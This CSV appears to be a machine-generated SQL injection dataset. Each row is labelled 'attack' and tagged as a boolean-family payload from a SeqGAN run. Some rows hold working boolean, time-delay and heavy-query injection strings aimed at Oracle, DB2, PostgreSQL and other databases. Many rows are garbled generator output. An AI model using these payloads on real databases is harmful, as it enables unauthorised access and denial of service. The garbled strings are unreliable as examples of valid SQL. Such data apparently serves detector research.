label,payload,family,payload_type,method,run_id,sample_index
attack,"-""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""hdl_k' like 'g,s t   atexp_ingust  laincuinsystall_umarm.tapibub$r'  =  'gipeft  =  (  =    (  6388 from    (  lerep  (    =  4018  (    s  =  =  l_us atal_usrteepdomainun.sys t2perioleres asystrett_ux#   (  113",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,988
attack,1dr2961,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,989
attack,1'  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,990
attack,"1   /*""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,991
attack,"1""--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,992
attack,"1""   from abs asertatat_ustriomb",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,993
attack,1%W%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,994
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,995
attack,1%' or 8384  =  like  (  'ab,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,996
attack,"11'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'n77",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,997
attack,"-""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""hhz'  )   and    (    (   ' where 6671 orypc  ==    7793  =  =  x a(  118  t  =    (  =  select or  (  119  (  2774 _ 2180 7555 1087  =  =  ft  count  (  =  =  (  =_k 2027  =    (  =     (  *  ""yobb"" 2724  =  0x7171706a71s 2774  =  1087  (   (  rdpeaictyefctyperingyp_tous and ioblt6671  (     1087  )  w",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,998
attack,"1""  =  ""1ng  *pexpcllll_u.rakdblll_upteru1eastioning  ribl_s where or char  =  char _ 7555 7555  =  gex5286ex(  =  2642  (  rs ts char  (  =  ing  )     (  8288",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,999
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1000
attack,"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1001
attack,"1""     )  us 8571  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1002
attack,"-9133i$repul_ustat1olunt  (  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '  (  99   (  =  122  (      (  =  =  =   6671 or 1  =  1087gfrom or ref  (  =  select or   =  2961  =  =  *  (  =  = or _(    (  *   (  =  =  =  (  f rigers t1,dmnstables ab$comaintrerepet_ubl_ket_k ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1003
attack,"1   rug'  =  'rvfgz%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1004
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '""ub)   9575   char  (  7522  ciintchar  *    =  (1  =  6849    =  (  =  (  =  =  7555 4018  ( =  repdblalegeft  (  7793   or select   (    =  re_ubrdoblumatrert  =  *exr_uoblons inmas ers {y  recous' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1005
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1006
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1007
attack,1   )  )    )    (uppe  =  rect  =  )  =  2961 char  =  =  =  =ex  6849  3352 6849  (  =    (  =    (  0x7171706a71rt  )  (    (  select 2027(  (  select 5485exp_b  (  =  = 3352  (  h  =  2774 2642 6388 4799  =  orrigexp_k and or rpt  =    =  =  (  (    =e9643  (  (  (  7555 a('cgou' 3880  5485  (   3862 a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1008
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rjtsedpl_t_us t4--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1009
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1010
attack,"1'""   ) 1570    )  rrex  =  =    (  =    (  select char  (  77  3880 6671    =(  =  (  =  =  =  (  7555 7522   (  =  6388 char  =  =  =  =    =   _upep_* 9643  char  (  =  88  (  =  (    =  4799 6671 (   3580  =  (    =    or c domaingex",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1011
attack,"1,'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1012
attack,"1   )      )    or      =  6388 as '  =  ' char  =  =  (  (  (  (  =  =_k t3  =  q  3862   (  =  =  select 9643  2774  = 3880  =  (  =  xL  (  _lexptt_us where t  (  (  =    =  (  p  =  119secdbligepe_us aiobm.stas rs aillibs  =    ' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1013
attack,"1'+  (  select 'b$dbg%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1014
attack,"-8288%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""m'ug",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1015
attack,"1""   ) 6093  =  2027    (  =  =    r  2724  (  =  =  77  =p_updomallin2ns t2peadoleuinghg  (  , or  (  b  (  =  =  else 2 (    =  2180  =      =  =  =  =  =  =  121  2tr_upas t4b  (  =  if(     )  =  3038  =  6388 rL  (  4018  =  char  =  6503 char  (  (  (  =  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1016
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""t  =  (  select and t3  =  6849 6388 cor concat    (  c(  =  =  113  --ge  =  =  (    (  (  =  6388 where _susyras t3  )    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1017
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1018
attack,-1' where 9198  (  =  L  (  =   7555  3862 =  121  =  =    =  cyp_ibss ainl_ustabl_ktl_usysasdin.s taomain.abmatpggk  (  =  =  = 9643  (  =  =  char(  7793  =  or and tchar  =  =  =    (  (  =    convert  (  =  =  =  4018  =  f  repefc_peft3  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1019
attack,"1'   )   or   )   1087 char  (  ryppq_s cobllr  (  =  r t3,  (  =x  (    (  =  =  (  6671    (  =  83  =  6849 where 6093 select 1087 char  (  * t  =  =  69  =  =  y_and 1087  =  (  2027 t4char  =  =  =    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1020
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1021
attack,-2583e8571  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1022
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'um as atect4,aim_iblt_s aint2,strrex     )   all_upcsuldseft2as t1,dblepeatc_usllmipll_ubys t3  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1023
attack,"1""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1024
attack,"1%""  =  """" like """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1025
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1026
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1027
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  ""m",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1028
attack,"1""  =  ""69,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1029
attack,"1     %' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1030
attack,"-""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""16171"" where 3880  (  =  =  (   select 6388 3455  (  =  =  select x  =  =e4018  (  2180  intchar 5556   =    (  =  =  3862  (  (  6388  =    *  =  (  (  =  3352=  3880  (     )  =  (  (  (  (  6388 2642 char  (  *  (  3880  =  =  (  (  6671 char  =  =  (  char   r  (  =  rage,  (  =  select from char  =  (  7793 ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1031
attack,"1%'||  (  select 'l""  =  ""  select 7417  )  r or   (    (  4018 r_rv  ref  =  =  =  =  hcoudbntag(  =    (  char  3880  =    (  )  =  (  (  =  =  (  7555(  =  7522 when   =  (  7555  (    3862 char  =  (  =  =  )  re,xp_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1032
attack,"1'   =    agh5556  6849  (  (  3862  (  =  3352 char  (  =  char  select 8691  3880  83 a  (  char  2961  io$ffintcoma anger  (  48  =  (  hxp_ibss t1,as intesyrdof.tasys t1bmj where csarustains ibinsms ain.riblesesint2peibl_us",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1033
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'ns where where  5286  =  =  1087tapp  =e2774  =  1570  =  (  3393  (  (  ""dskh""  =  3880  =  _ibmns domas t3,500000000siounin.ter  =  (    (  3455  (  char  2961 7522  =  =  (  6671  (  8288p_s ounstal_us 6671s t2dbgex",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1034
attack,"-94621""   16405  =  = and h_mppexp_ d ft(  =  =  (  repdounsib' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1035
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""ug",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1036
attack,"1""   ryxtz=    )  =    and 1087   (  =   char    =  (  =   =  =    (    (  =  =  L    ( like 3862  =  7793 from concat  (  3880adibsihteib$tes tl_usess charyptcy  )    as and 4018  =  =  *  t or and 2  =  8403rep  _s tt=   8315 char  118  *  =  =  99  (  =  7522  (  =  cl",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1037
attack,"1""--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1038
attack,1%' or 8384  =  like  (  'rhyj,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1039
attack,1%',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1040
attack,"1 where where 1570  =    luninvegtryp  (   'cgou' t  (  =  7793  (  =* 6093 *cs r_s t1,dbldlep_updble,eperor_ t3  (  r coub%""  =  ""sibm.dbl_subl' char  *  =  (  =  =  *xpct_upeas reft_k aomgexp_sibldomdomasimsig",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1041
attack,"1%""  =  ""char  113  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1042
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1043
attack,""" 1668  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1044
attack,"1%%a""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1045
attack,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1046
attack,"1%0x717a767a71)4906   mt,,xp_s as as where 3880 6671   selecttap_s  comase0x717a767a71strs t1,rpepecrep_s  5485us    rupet_(     rseahrtefgepoblef2642 from 3  ringexingeft or t  (  rdol_ubleas t5  )  * concat  =  =z where 6 2961  =    (  2642 apain ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1047
attack,"1eabasysiom.does t3,domas tystakexp_us where 8571 char  =    2027  (  3352  =  select coublngexs or char  =  =  )  =  =  =  (  69  =  =  =  2642 or t  = 33524906 and or when a(  =  (  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1048
